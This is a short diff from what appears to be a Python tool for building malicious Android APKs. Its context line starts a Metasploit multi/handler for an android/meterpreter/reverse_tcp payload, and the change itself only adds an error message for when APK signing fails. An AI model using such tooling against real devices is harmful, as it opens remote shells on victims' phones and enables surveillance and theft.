@@ -416,7 +416,8 @@ def mainlist():
                 os.system('msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set lhost '+rhost+';set lport '+rport+';show options"')
             else:
                 sys.exit(1)
-            
+    else:
+        print(r+"[!]"+w+" failed to sign apk file")
 
 def main():
     while True:
